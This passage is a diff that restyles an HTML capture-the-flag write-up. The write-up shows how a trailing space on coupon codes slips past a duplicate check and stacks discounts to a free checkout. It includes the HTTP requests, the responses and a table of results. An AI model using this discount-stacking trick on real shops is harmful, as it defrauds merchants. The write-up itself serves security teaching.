@@ -6,382 +6,373 @@
 <title>Business Logic Flaw in Cart Discounts — CTF Writeup</title>
 <style>
   :root {
-    --sage-dark:   #659287;
-    --sage-mid:    #88BDA4;
-    --sage-light:  #B1D3B9;
-    --sage-pale:   #E6F2DD;
-    --ink:         #1c2d27;
-    --ink-mid:     #3a5048;
-    --ink-light:   #5a7068;
-    --surface:     #f4fbf0;
-    --border:      #c8dfc9;
-    --border-mid:  #a8cdb0;
-    --mono: 'SF Mono','Fira Code',Menlo,Consolas,monospace;
-    --sans: -apple-system,BlinkMacSystemFont,'SF Pro Text','Helvetica Neue',sans-serif;
+    --bg:        #0a0d10;
+    --bg-raised: #10151a;
+    --bg-card:   #0d1216;
+    --line:      #1f2b33;
+    --line-mid:  #2c3c47;
+    --amber:     #ffb454;
+    --amber-dim: #c98a3e;
+    --cyan:      #5ad4d4;
+    --red:       #ff6b6b;
+    --green:     #6fd68f;
+    --text:      #d4dde3;
+    --text-dim:  #7c8a94;
+    --text-mute: #4f5c66;
+    --mono: 'JetBrains Mono','Fira Code','SF Mono',Menlo,Consolas,monospace;
   }
 
   *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-  html { font-size: 16px; -webkit-font-smoothing: antialiased; }
+  html { font-size: 16px; }
 
   body {
-    background: var(--sage-pale);
-    color: var(--ink);
-    font-family: var(--sans);
-    font-size: 1rem;
+    background: var(--bg);
+    background-image:
+      linear-gradient(rgba(255,180,84,0.025) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(255,180,84,0.025) 1px, transparent 1px);
+    background-size: 42px 42px;
+    color: var(--text);
+    font-family: var(--mono);
+    font-size: 0.92rem;
     line-height: 1.75;
-    max-width: 800px;
+    max-width: 840px;
     margin: 0 auto;
-    padding: 72px 32px 112px;
+    padding: 56px 28px 120px;
   }
 
-  .eyebrow {
-    display: flex;
-    align-items: center;
-    gap: 8px;
-    margin-bottom: 20px;
-    font-size: 0.72rem;
-    font-weight: 600;
-    letter-spacing: 0.12em;
-    text-transform: uppercase;
-    color: var(--sage-dark);
-  }
-  .eyebrow-line {
-    width: 24px; height: 1.5px;
-    background: var(--sage-dark);
-    flex-shrink: 0;
-  }
-
-  h1 {
-    font-size: 2rem;
-    font-weight: 700;
-    letter-spacing: -0.03em;
-    line-height: 1.2;
-    color: var(--ink);
-    margin-bottom: 16px;
-  }
-
-  .lede {
-    font-size: 1rem;
-    color: var(--ink-mid);
-    line-height: 1.7;
-    margin-bottom: 28px;
-    max-width: 620px;
-    border-left: 2px solid var(--sage-dark);
-    padding-left: 16px;
-  }
-
-  .chips {
-    display: flex;
-    flex-wrap: wrap;
-    gap: 6px;
-    margin-bottom: 52px;
-  }
-
-  .chip {
-    display: inline-flex;
-    align-items: center;
-    gap: 6px;
-    background: var(--surface);
-    border: 1px solid var(--border);
-    border-radius: 6px;
-    padding: 5px 12px;
-    font-size: 0.77rem;
-    color: var(--ink-mid);
-    font-weight: 500;
-  }
-  .chip svg { color: var(--sage-dark); flex-shrink: 0; }
-
-  hr { border: none; border-top: 1px solid var(--border); margin: 48px 0; }
-
-  h2 {
-    font-size: 1.15rem;
-    font-weight: 700;
-    letter-spacing: -0.02em;
-    color: var(--ink);
-    margin: 48px 0 14px;
+  /* ── HEADER ── */
+  .prompt {
     display: flex;
     align-items: center;
     gap: 10px;
+    margin-bottom: 24px;
+    font-size: 0.72rem;
+    color: var(--amber-dim);
+    letter-spacing: 0.04em;
   }
-  h2::before {
-    content: '';
+  .prompt::before { content: '$'; color: var(--green); font-weight: 700; }
+  .prompt .blink {
     display: inline-block;
-    width: 4px; height: 18px;
-    background: var(--sage-dark);
-    border-radius: 2px;
-    flex-shrink: 0;
+    width: 7px; height: 14px;
+    background: var(--amber);
+    animation: blink 1.1s steps(1) infinite;
+  }
+  @keyframes blink { 50% { opacity: 0; } }
+
+  h1 {
+    font-size: 1.7rem;
+    font-weight: 700;
+    line-height: 1.3;
+    color: #f4f7f9;
+    margin-bottom: 18px;
+    letter-spacing: -0.01em;
+  }
+  h1 .acc { color: var(--amber); }
+
+  .lede {
+    font-size: 0.92rem;
+    color: var(--text-dim);
+    line-height: 1.8;
+    margin-bottom: 26px;
+    max-width: 660px;
+    padding: 16px 18px;
+    background: var(--bg-raised);
+    border: 1px solid var(--line);
+    border-left: 3px solid var(--amber);
   }
 
-  h3 {
-    font-size: 0.72rem;
+  .tags {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 8px;
+    margin-bottom: 50px;
+  }
+  .tag {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    background: var(--bg-raised);
+    border: 1px solid var(--line-mid);
+    padding: 4px 11px;
+    font-size: 0.68rem;
+    color: var(--cyan);
+    letter-spacing: 0.06em;
+    text-transform: uppercase;
+  }
+  .tag::before { content: '#'; color: var(--text-mute); }
+
+  hr { border: none; border-top: 1px dashed var(--line-mid); margin: 52px 0; }
+
+  /* ── HEADINGS ── */
+  h2 {
+    font-size: 0.78rem;
     font-weight: 700;
     letter-spacing: 0.1em;
     text-transform: uppercase;
-    color: var(--sage-dark);
-    margin: 32px 0 10px;
+    color: var(--amber);
+    margin: 52px 0 18px;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+  }
+  h2::before { content: '//'; color: var(--text-mute); font-weight: 400; }
+  h2::after {
+    content: '';
+    flex: 1;
+    height: 1px;
+    background: var(--line);
   }
 
-  p { color: var(--ink-mid); font-size: 0.97rem; margin-bottom: 14px; }
+  h3 {
+    font-size: 0.7rem;
+    font-weight: 700;
+    letter-spacing: 0.08em;
+    text-transform: uppercase;
+    color: var(--cyan);
+    margin: 30px 0 10px;
+  }
+  h3::before { content: '> '; color: var(--text-mute); }
+
+  p { color: var(--text-dim); font-size: 0.89rem; margin-bottom: 14px; line-height: 1.8; }
   p:last-child { margin-bottom: 0; }
-  strong { color: var(--ink); font-weight: 600; }
-  a { color: var(--sage-dark); text-decoration: underline; text-decoration-color: var(--sage-light); }
-  ul, ol { padding-left: 20px; color: var(--ink-mid); font-size: 0.97rem; margin-bottom: 14px; }
-  li { margin-bottom: 7px; }
+  strong { color: var(--text); font-weight: 600; }
+  a { color: var(--cyan); text-decoration: none; border-bottom: 1px dotted var(--cyan); }
+  ul, ol { padding-left: 22px; color: var(--text-dim); font-size: 0.89rem; margin-bottom: 14px; }
+  li { margin-bottom: 8px; }
+  li::marker { color: var(--amber-dim); }
 
   code {
     font-family: var(--mono);
-    font-size: 0.82em;
-    background: var(--sage-light);
-    border-radius: 4px;
+    font-size: 0.86em;
+    background: var(--bg-raised);
+    border: 1px solid var(--line);
+    border-radius: 3px;
     padding: 1px 6px;
-    color: var(--ink);
+    color: var(--amber);
   }
 
+  /* ── CODE BLOCKS ── */
   .code-block { margin: 16px 0 24px; }
 
   .code-tab {
     display: inline-flex;
     align-items: center;
-    gap: 6px;
-    background: var(--sage-mid);
-    border-radius: 6px 6px 0 0;
-    padding: 5px 14px;
-    font-family: var(--mono);
-    font-size: 0.68rem;
-    color: var(--surface);
+    gap: 7px;
+    background: var(--bg-raised);
+    border: 1px solid var(--line-mid);
+    border-bottom: none;
+    padding: 5px 13px;
+    font-size: 0.66rem;
+    color: var(--text-dim);
     font-weight: 600;
-    letter-spacing: 0.04em;
+    letter-spacing: 0.05em;
     text-transform: uppercase;
   }
-  .code-tab svg { opacity: 0.8; }
+  .code-tab::before { content: '●'; color: var(--amber-dim); font-size: 0.6rem; }
 
   pre {
-    background: var(--ink);
-    border-radius: 0 6px 6px 6px;
-    padding: 18px 20px;
+    background: #07090b;
+    border: 1px solid var(--line-mid);
+    padding: 17px 19px;
     overflow-x: auto;
     font-family: var(--mono);
-    font-size: 0.82rem;
-    line-height: 1.65;
-    color: var(--sage-light);
+    font-size: 0.78rem;
+    line-height: 1.7;
+    color: #9fb0ba;
   }
+  .code-block:has(.code-tab) pre { border-top: none; }
 
-  .code-block.bare pre { border-radius: 6px; }
+  pre .hl  { color: var(--amber); font-weight: 600; }
+  pre .key { color: var(--cyan); }
+  pre .val { color: var(--green); }
+  pre .cmt { color: var(--text-mute); font-style: italic; }
+  pre .bad { color: var(--red); }
+  pre .hdr { color: #8fb3e0; }
+  pre .dim { color: var(--text-mute); }
+  pre .ws  { background: #4a2020; outline: 1px solid var(--red); }
 
-  pre .hl  { color: #f0d080; font-weight: 600; }
-  pre .key { color: #88BDA4; }
-  pre .val { color: #a8d8b0; }
-  pre .cmt { color: #5a7060; font-style: italic; }
-  pre .bad { color: #e08080; }
-  pre .hdr { color: #b0c8ff; }
-  pre .dim { color: #4a6055; }
-  pre .ws  { background: #5a3030; border-radius: 2px; }
-
+  /* ── CLAIM CARDS ── */
   .claim {
-    border: 1px solid var(--border);
-    border-radius: 10px;
-    overflow: hidden;
+    border: 1px solid var(--line-mid);
     margin: 18px 0 26px;
-    background: var(--surface);
+    background: var(--bg-card);
   }
-
   .claim-header {
     display: flex;
     align-items: center;
     gap: 12px;
-    padding: 13px 18px;
-    background: var(--sage-light);
-    border-bottom: 1px solid var(--border);
+    padding: 12px 17px;
+    background: var(--bg-raised);
+    border-bottom: 1px solid var(--line-mid);
   }
-
   .claim-num {
-    width: 22px; height: 22px;
-    border-radius: 50%;
-    background: var(--sage-dark);
-    color: #fff;
+    font-family: var(--mono);
     font-size: 0.72rem;
     font-weight: 700;
-    display: flex;
-    align-items: center;
-    justify-content: center;
+    color: var(--amber);
+    border: 1px solid var(--amber-dim);
+    width: 22px; height: 22px;
+    display: flex; align-items: center; justify-content: center;
     flex-shrink: 0;
   }
-
-  .claim-title {
-    font-size: 0.88rem;
-    font-weight: 600;
-    color: var(--ink);
-  }
-
-  .claim-body { padding: 18px 20px; }
-  .claim-body pre { margin: 12px 0; border-radius: 6px; }
+  .claim-title { font-size: 0.82rem; font-weight: 600; color: var(--text); }
+  .claim-body { padding: 17px 19px; }
+  .claim-body pre { margin: 12px 0; }
   .claim-body p { margin-bottom: 10px; }
 
+  /* ── TABLE ── */
   .table-wrap {
-    border: 1px solid var(--border);
-    border-radius: 8px;
+    border: 1px solid var(--line-mid);
     overflow: hidden;
     margin: 14px 0 18px;
-    background: var(--surface);
+    background: var(--bg-card);
   }
-
-  table { width: 100%; border-collapse: collapse; font-size: 0.85rem; }
-  thead tr { background: var(--sage-light); border-bottom: 1px solid var(--border-mid); }
+  table { width: 100%; border-collapse: collapse; font-size: 0.8rem; }
+  thead tr { background: var(--bg-raised); border-bottom: 1px solid var(--line-mid); }
   th {
     text-align: left;
-    padding: 10px 16px;
-    color: var(--ink);
+    padding: 9px 15px;
+    color: var(--cyan);
     font-weight: 600;
-    font-size: 0.72rem;
-    letter-spacing: 0.07em;
+    font-size: 0.66rem;
+    letter-spacing: 0.08em;
     text-transform: uppercase;
   }
   td {
-    padding: 9px 16px;
-    border-bottom: 1px solid var(--border);
-    color: var(--ink-mid);
+    padding: 8px 15px;
+    border-bottom: 1px solid var(--line);
+    color: var(--text-dim);
     font-family: var(--mono);
-    font-size: 0.8rem;
+    font-size: 0.78rem;
   }
   tr:last-child td { border-bottom: none; }
   td.num { text-align: right; }
 
-  .pass { display: inline-flex; align-items: center; gap: 5px; color: #2a7a50; font-weight: 600; font-family: var(--sans); font-size: 0.8rem; }
-  .fail { display: inline-flex; align-items: center; gap: 5px; color: #b04040; font-weight: 600; font-family: var(--sans); font-size: 0.8rem; }
+  .pass { display: inline-flex; align-items: center; gap: 5px; color: var(--green); font-weight: 600; font-size: 0.76rem; }
+  .fail { display: inline-flex; align-items: center; gap: 5px; color: var(--red); font-weight: 600; font-size: 0.76rem; }
 
-  .step { display: flex; gap: 16px; margin-bottom: 34px; align-items: flex-start; }
-
+  /* ── STEPS ── */
+  .step { display: flex; gap: 16px; margin-bottom: 32px; align-items: flex-start; }
   .step-num {
-    width: 28px; height: 28px;
-    border-radius: 50%;
-    border: 1.5px solid var(--sage-mid);
-    color: var(--sage-dark);
-    font-size: 0.78rem;
+    font-family: var(--mono);
+    width: 26px; height: 26px;
+    border: 1px solid var(--line-mid);
+    color: var(--amber);
+    font-size: 0.72rem;
     font-weight: 700;
-    display: flex;
-    align-items: center;
-    justify-content: center;
+    display: flex; align-items: center; justify-content: center;
     flex-shrink: 0;
-    margin-top: 1px;
-    background: var(--surface);
+    background: var(--bg-raised);
   }
-
   .step-content { flex: 1; min-width: 0; }
-  .step-title { font-size: 0.95rem; font-weight: 600; color: var(--ink); margin-bottom: 10px; }
+  .step-title { font-size: 0.86rem; font-weight: 600; color: var(--text); margin-bottom: 10px; }
 
+  /* ── FLAG ── */
   .flag-card {
     display: flex;
     align-items: center;
-    gap: 18px;
-    background: var(--sage-light);
-    border: 1px solid var(--sage-mid);
-    border-radius: 10px;
-    padding: 20px 24px;
-    margin: 22px 0 30px;
+    gap: 16px;
+    background: var(--bg-raised);
+    border: 1px solid var(--amber-dim);
+    padding: 18px 22px;
+    margin: 22px 0 28px;
   }
   .flag-label {
-    font-size: 0.68rem;
+    font-size: 0.64rem;
     font-weight: 700;
     letter-spacing: 0.1em;
     text-transform: uppercase;
-    color: var(--sage-dark);
+    color: var(--amber-dim);
     margin-bottom: 5px;
   }
   .flag-value {
     font-family: var(--mono);
-    font-size: 0.95rem;
-    color: var(--ink);
+    font-size: 0.88rem;
+    color: var(--amber);
     font-weight: 600;
-    letter-spacing: 0.02em;
   }
 
+  /* ── CALLOUT ── */
   .callout {
     display: flex;
     gap: 12px;
     align-items: flex-start;
-    background: var(--surface);
-    border: 1px solid var(--border);
-    border-left: 3px solid var(--sage-dark);
-    border-radius: 0 8px 8px 0;
+    background: var(--bg-card);
+    border: 1px solid var(--line-mid);
+    border-left: 3px solid var(--cyan);
     padding: 14px 18px;
     margin: 18px 0;
-    font-size: 0.92rem;
-    color: var(--ink-mid);
+    font-size: 0.85rem;
+    color: var(--text-dim);
   }
-  .callout svg { flex-shrink: 0; margin-top: 2px; color: var(--sage-dark); }
+  .callout::before { content: 'i'; font-family: var(--mono); font-weight: 700; color: var(--cyan); border: 1px solid var(--cyan); width: 18px; height: 18px; display: flex; align-items: center; justify-content: center; font-size: 0.7rem; flex-shrink: 0; }
 
+  /* ── DIAGRAM ── */
   .diagram {
-    background: var(--surface);
-    border: 1px solid var(--border);
-    border-radius: 10px;
-    padding: 32px 24px 28px;
+    background: var(--bg-card);
+    border: 1px solid var(--line-mid);
+    padding: 30px 22px 26px;
     margin: 24px 0 32px;
     overflow-x: auto;
   }
   .diagram-label {
-    font-size: 0.68rem;
+    font-size: 0.66rem;
     font-weight: 700;
     letter-spacing: 0.12em;
     text-transform: uppercase;
-    color: var(--sage-dark);
+    color: var(--amber-dim);
     text-align: center;
-    margin-bottom: 28px;
+    margin-bottom: 26px;
   }
 
-  .fix { display: flex; gap: 14px; align-items: flex-start; margin-bottom: 30px; }
+  /* ── FIX ── */
+  .fix { display: flex; gap: 14px; align-items: flex-start; margin-bottom: 28px; }
   .fix-num {
-    width: 24px; height: 24px;
-    border-radius: 50%;
-    background: var(--sage-light);
-    border: 1.5px solid var(--sage-mid);
-    color: var(--sage-dark);
-    font-size: 0.72rem;
+    font-family: var(--mono);
+    width: 22px; height: 22px;
+    border: 1px solid var(--green);
+    color: var(--green);
+    font-size: 0.68rem;
     font-weight: 700;
-    display: flex;
-    align-items: center;
-    justify-content: center;
+    display: flex; align-items: center; justify-content: center;
     flex-shrink: 0;
-    margin-top: 2px;
   }
   .fix-content { flex: 1; min-width: 0; }
-  .fix-title { font-size: 0.9rem; font-weight: 600; color: var(--ink); margin-bottom: 10px; }
+  .fix-title { font-size: 0.84rem; font-weight: 600; color: var(--text); margin-bottom: 10px; }
 
   .learn {
-    background: var(--sage-light);
-    border-radius: 8px;
-    padding: 13px 16px;
-    margin: 16px 0 0;
-    font-size: 0.87rem;
-    color: var(--ink-mid);
-    display: flex;
-    gap: 10px;
-    align-items: flex-start;
+    background: var(--bg-raised);
+    border-left: 2px solid var(--amber-dim);
+    padding: 11px 15px;
+    margin: 14px 0 0;
+    font-size: 0.8rem;
+    color: var(--text-dim);
   }
-  .learn svg { flex-shrink: 0; margin-top: 2px; color: var(--sage-dark); }
-  .learn strong { color: var(--ink); }
+  .learn strong { color: var(--amber); }
 
+  /* ── FOOTER ── */
   footer {
-    margin-top: 64px;
-    padding-top: 22px;
-    border-top: 1px solid var(--border);
-    font-size: 0.78rem;
-    color: var(--ink-light);
+    margin-top: 60px;
+    padding-top: 20px;
+    border-top: 1px dashed var(--line-mid);
+    font-size: 0.72rem;
+    color: var(--text-mute);
     display: flex;
     justify-content: space-between;
     flex-wrap: wrap;
     gap: 8px;
   }
+  footer a { color: var(--text-dim); }
 </style>
 </head>
 <body>
 
 <!-- ── HEADER ── -->
-<div class="eyebrow">
-  <span class="eyebrow-line"></span>
-  Intigriti CTF &nbsp;·&nbsp; October 2026 &nbsp;·&nbsp; Business Logic
+<div class="prompt">
+  intigriti-ctf --month=2026-10 --category=business-logic<span class="blink"></span>
 </div>
 
-<h1>Two checks, one truth they forgot to share</h1>
+<h1>Two checks, <span class="acc">one truth</span> they forgot to share</h1>
 
 <p class="lede">
   A coupon endpoint is really two functions wearing one route: "is this code
@@ -391,24 +382,14 @@
   capped 50% discount into a free checkout.
 </p>
 
-<div class="chips">
-  <span class="chip">
-    <svg width="12" height="12" viewBox="0 0 16 16" fill="none"><path d="M2 13l4-4 3 3 5-6" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/><path d="M11 5h3v3" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
-    Business Logic Error
-  </span>
-  <span class="chip">
-    <svg width="12" height="12" viewBox="0 0 16 16" fill="none"><path d="M8 2L2 6v4c0 3 2.5 5.5 6 6 3.5-.5 6-3 6-6V6L8 2z" stroke="currentColor" stroke-width="1.5" stroke-linejoin="round"/></svg>
-    Medium
-  </span>
-  <span class="chip">
-    <svg width="12" height="12" viewBox="0 0 16 16" fill="none"><path d="M2 3h12v10H2z" stroke="currentColor" stroke-width="1.5" rx="1"/></svg>
-    challenge-1026.challenges.intigriti.io
-  </span>
+<div class="tags">
+  <span class="tag">business-logic-error</span>
+  <span class="tag">medium</span>
+  <span class="tag">challenge-1026.challenges.intigriti.io</span>
 </div>
 
 <hr>
 
-<!-- ── THE APP ── -->
 <h2>The Setup</h2>
 
 <p>
@@ -427,7 +408,6 @@
   finding a way past that cap.
 </p>
 
-<!-- ── OVERVIEW ── -->
 <h2>Where the Two Checks Disagree</h2>
 
 <p>
@@ -451,65 +431,51 @@
 
 <hr>
 
-<!-- ── EVIDENCE ── -->
 <h2>Evidence</h2>
 
 <div class="claim">
   <div class="claim-header">
-    <div class="claim-num">1</div>
+    <div class="claim-num">01</div>
     <div class="claim-title">The dedup check works — for an exact match</div>
   </div>
   <div class="claim-body">
     <div class="code-block">
-      <div class="code-tab">
-        <svg width="9" height="9" viewBox="0 0 16 16" fill="none"><path d="M2 8h12M8 2l6 6-6 6" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
-        Request
-      </div>
+      <div class="code-tab">request</div>
       <pre><span class="key">POST</span> /api/cart/coupon HTTP/1.1
 Host: challenge-1026.challenges.intigriti.io
 Content-Type: application/json
 
 {"code":"NIGHT20"}   <span class="cmt">// sent twice, identical</span></pre>
     </div>
-    <div class="code-block bare">
-      <pre>HTTP/1.1 <span class="val">200 OK</span>            <span class="cmt">← first: discount applied</span>
+    <pre>HTTP/1.1 <span class="val">200 OK</span>            <span class="cmt">← first: discount applied</span>
 HTTP/1.1 <span class="bad">400 Bad Request</span>   <span class="cmt">← second: "Coupon already applied"</span></pre>
-    </div>
     <p>So there is a real guard here, not a missing one — it just answers a narrower question than it thinks it does.</p>
   </div>
 </div>
 
 <div class="claim">
   <div class="claim-header">
-    <div class="claim-num">2</div>
+    <div class="claim-num">02</div>
     <div class="claim-title">One space is enough to look like a new code</div>
   </div>
   <div class="claim-body">
     <div class="code-block">
-      <div class="code-tab">
-        <svg width="9" height="9" viewBox="0 0 16 16" fill="none"><path d="M2 8h12M8 2l6 6-6 6" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
-        Request
-      </div>
+      <div class="code-tab">request</div>
       <pre><span class="key">POST</span> /api/cart/coupon HTTP/1.1
 Host: challenge-1026.challenges.intigriti.io
 Content-Type: application/json
 
 {"code":"NIGHT20<span class="ws"> </span>"}</pre>
     </div>
-    <div class="code-block bare">
-      <pre>HTTP/1.1 <span class="val">200 OK</span>
+    <pre>HTTP/1.1 <span class="val">200 OK</span>
 {"discount": "20%", "cartTotal": "399.60"}   <span class="cmt">← accepted as a fresh coupon</span></pre>
-    </div>
-    <div class="learn">
-      <svg width="14" height="14" viewBox="0 0 16 16" fill="none"><circle cx="8" cy="8" r="6.5" stroke="currentColor" stroke-width="1.5"/><path d="M8 7v4M8 5.5v.5" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/></svg>
-      <span><strong>Why it matters:</strong> normalization that's applied in one place and assumed everywhere else isn't normalization — it's a second, hidden definition of "the same input" that nobody reconciled.</span>
-    </div>
+    <div class="learn"><strong>Why it matters:</strong> normalization applied in one place and assumed everywhere else isn't normalization — it's a second, hidden definition of "the same input" that nobody reconciled.</div>
   </div>
 </div>
 
 <div class="claim">
   <div class="claim-header">
-    <div class="claim-num">3</div>
+    <div class="claim-num">03</div>
     <div class="claim-title">It caps at double, not infinite — and that's still enough</div>
   </div>
   <div class="claim-body">
@@ -517,11 +483,11 @@ Content-Type: application/json
       <table>
         <thead><tr><th>Call</th><th>Payload</th><th>Result</th><th class="num">Running Discount</th></tr></thead>
         <tbody>
-          <tr><td>1</td><td>{"code":"NIGHT20"}</td><td><span class="pass"><svg width="11" height="11" viewBox="0 0 16 16" fill="none"><path d="M3 8l3.5 3.5L13 5" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>Applied</span></td><td class="num">20%</td></tr>
-          <tr><td>2</td><td>{"code":"NEWS30"}</td><td><span class="pass"><svg width="11" height="11" viewBox="0 0 16 16" fill="none"><path d="M3 8l3.5 3.5L13 5" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>Applied</span></td><td class="num">50%</td></tr>
-          <tr><td>3</td><td>{"code":"NIGHT20&nbsp;"}</td><td><span class="pass"><svg width="11" height="11" viewBox="0 0 16 16" fill="none"><path d="M3 8l3.5 3.5L13 5" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>Applied</span></td><td class="num">70%</td></tr>
-          <tr><td>4</td><td>{"code":"NEWS30&nbsp;"}</td><td><span class="pass"><svg width="11" height="11" viewBox="0 0 16 16" fill="none"><path d="M3 8l3.5 3.5L13 5" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>Applied</span></td><td class="num" style="color:#2a7a50;font-weight:700;">100%</td></tr>
-          <tr><td>5</td><td>{"code":"NIGHT20&nbsp;&nbsp;"} (2 spaces)</td><td><span class="fail"><svg width="11" height="11" viewBox="0 0 16 16" fill="none"><path d="M4 4l8 8M12 4l-8 8" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>Rejected — cart already 100%</span></td><td class="num">100%</td></tr>
+          <tr><td>1</td><td>{"code":"NIGHT20"}</td><td><span class="pass">✓ applied</span></td><td class="num">20%</td></tr>
+          <tr><td>2</td><td>{"code":"NEWS30"}</td><td><span class="pass">✓ applied</span></td><td class="num">50%</td></tr>
+          <tr><td>3</td><td>{"code":"NIGHT20&nbsp;"}</td><td><span class="pass">✓ applied</span></td><td class="num">70%</td></tr>
+          <tr><td>4</td><td>{"code":"NEWS30&nbsp;"}</td><td><span class="pass">✓ applied</span></td><td class="num" style="color:var(--green);font-weight:700;">100%</td></tr>
+          <tr><td>5</td><td>{"code":"NIGHT20&nbsp;&nbsp;"} (2 spaces)</td><td><span class="fail">✗ rejected — already 100%</span></td><td class="num">100%</td></tr>
         </tbody>
       </table>
     </div>
@@ -531,118 +497,100 @@ Content-Type: application/json
 
 <hr>
 
-<!-- ── EXPLOIT ── -->
 <h2>Walking Through It</h2>
 
 <div class="diagram">
-  <div class="diagram-label">From €666.00 to €0.00</div>
+  <div class="diagram-label">from €666.00 to €0.00</div>
   <svg viewBox="0 0 720 130" xmlns="http://www.w3.org/2000/svg"
-       style="width:100%;max-width:720px;display:block;margin:0 auto;font-family:-apple-system,BlinkMacSystemFont,'Helvetica Neue',sans-serif">
+       style="width:100%;max-width:720px;display:block;margin:0 auto;font-family:'JetBrains Mono',monospace">
 
-    <line x1="60" y1="52" x2="660" y2="52" stroke="#B1D3B9" stroke-width="2"/>
+    <line x1="60" y1="52" x2="660" y2="52" stroke="#2c3c47" stroke-width="2"/>
 
-    <circle cx="60" cy="52" r="18" fill="#659287" stroke="#E6F2DD" stroke-width="2"/>
-    <path d="M53 48h8l2 4-2 4h-8l-2-4z" fill="none" stroke="#E6F2DD" stroke-width="1.4" stroke-linejoin="round"/>
-    <text x="60" y="86" text-anchor="middle" fill="#3a5048" font-size="10" font-weight="600">Cart opened</text>
-    <text x="60" y="98" text-anchor="middle" fill="#88BDA4" font-size="8.5">€666.00</text>
+    <rect x="42" y="34" width="36" height="36" fill="#10151a" stroke="#ffb454" stroke-width="1.5"/>
+    <text x="60" y="58" text-anchor="middle" fill="#ffb454" font-size="9" font-weight="700">01</text>
+    <text x="60" y="88" text-anchor="middle" fill="#d4dde3" font-size="9.5" font-weight="600">cart opened</text>
+    <text x="60" y="100" text-anchor="middle" fill="#7c8a94" font-size="8">€666.00</text>
 
-    <circle cx="210" cy="52" r="18" fill="#659287" stroke="#E6F2DD" stroke-width="2"/>
-    <text x="210" y="57" text-anchor="middle" fill="#E6F2DD" font-size="12" font-weight="700" font-family="'SF Mono',Menlo,monospace">x2</text>
-    <text x="210" y="86" text-anchor="middle" fill="#3a5048" font-size="10" font-weight="600">Codes applied clean</text>
-    <text x="210" y="98" text-anchor="middle" fill="#88BDA4" font-size="8.5">NIGHT20 + NEWS30 → 50%</text>
+    <rect x="192" y="34" width="36" height="36" fill="#10151a" stroke="#ffb454" stroke-width="1.5"/>
+    <text x="210" y="58" text-anchor="middle" fill="#ffb454" font-size="9" font-weight="700">02</text>
+    <text x="210" y="88" text-anchor="middle" fill="#d4dde3" font-size="9.5" font-weight="600">codes applied clean</text>
+    <text x="210" y="100" text-anchor="middle" fill="#7c8a94" font-size="8">NIGHT20 + NEWS30 → 50%</text>
 
-    <circle cx="370" cy="52" r="18" fill="#3a5048" stroke="#E6F2DD" stroke-width="2"/>
-    <text x="370" y="56" text-anchor="middle" fill="#E6F2DD" font-size="13" font-weight="700" font-family="'SF Mono',Menlo,monospace">␣</text>
-    <text x="370" y="86" text-anchor="middle" fill="#3a5048" font-size="10" font-weight="600">Codes applied again</text>
-    <text x="370" y="98" text-anchor="middle" fill="#88BDA4" font-size="8.5">+ trailing space → +50%</text>
+    <rect x="352" y="34" width="36" height="36" fill="#10151a" stroke="#ff6b6b" stroke-width="1.5"/>
+    <text x="370" y="58" text-anchor="middle" fill="#ff6b6b" font-size="9" font-weight="700">03</text>
+    <text x="370" y="88" text-anchor="middle" fill="#d4dde3" font-size="9.5" font-weight="600">codes applied again</text>
+    <text x="370" y="100" text-anchor="middle" fill="#7c8a94" font-size="8">+ trailing space → +50%</text>
 
-    <circle cx="530" cy="52" r="18" fill="#659287" stroke="#E6F2DD" stroke-width="2"/>
-    <path d="M524 48h8l-3 5h5l-8 8 2-6h-5z" fill="#E6F2DD"/>
-    <text x="530" y="86" text-anchor="middle" fill="#3a5048" font-size="10" font-weight="600">Cart hits 0</text>
-    <text x="530" y="98" text-anchor="middle" fill="#88BDA4" font-size="8.5">100% discount</text>
+    <rect x="512" y="34" width="36" height="36" fill="#10151a" stroke="#5ad4d4" stroke-width="1.5"/>
+    <text x="530" y="58" text-anchor="middle" fill="#5ad4d4" font-size="9" font-weight="700">04</text>
+    <text x="530" y="88" text-anchor="middle" fill="#d4dde3" font-size="9.5" font-weight="600">cart hits 0</text>
+    <text x="530" y="100" text-anchor="middle" fill="#7c8a94" font-size="8">100% discount</text>
 
-    <circle cx="660" cy="52" r="18" fill="#659287" stroke="#E6F2DD" stroke-width="2"/>
-    <path d="M654 44v16M654 44h9l-2.5 4 2.5 4h-9" fill="none" stroke="#E6F2DD" stroke-width="1.4" stroke-linecap="round" stroke-linejoin="round"/>
-    <text x="660" y="86" text-anchor="middle" fill="#3a5048" font-size="10" font-weight="600">Checkout clears</text>
-    <text x="660" y="98" text-anchor="middle" fill="#88BDA4" font-size="8.5">Flag returned</text>
-
-    <text x="60"  y="24" text-anchor="middle" fill="#659287" font-size="8" font-weight="700" letter-spacing="0.06em">1</text>
-    <text x="210" y="24" text-anchor="middle" fill="#659287" font-size="8" font-weight="700" letter-spacing="0.06em">2</text>
-    <text x="370" y="24" text-anchor="middle" fill="#659287" font-size="8" font-weight="700" letter-spacing="0.06em">3</text>
-    <text x="530" y="24" text-anchor="middle" fill="#659287" font-size="8" font-weight="700" letter-spacing="0.06em">4</text>
-    <text x="660" y="24" text-anchor="middle" fill="#659287" font-size="8" font-weight="700" letter-spacing="0.06em">5</text>
+    <rect x="642" y="34" width="36" height="36" fill="#10151a" stroke="#6fd68f" stroke-width="1.5"/>
+    <text x="660" y="58" text-anchor="middle" fill="#6fd68f" font-size="9" font-weight="700">05</text>
+    <text x="660" y="88" text-anchor="middle" fill="#d4dde3" font-size="9.5" font-weight="600">checkout clears</text>
+    <text x="660" y="100" text-anchor="middle" fill="#7c8a94" font-size="8">flag returned</text>
   </svg>
 </div>
 
 <div class="step">
-  <div class="step-num">1</div>
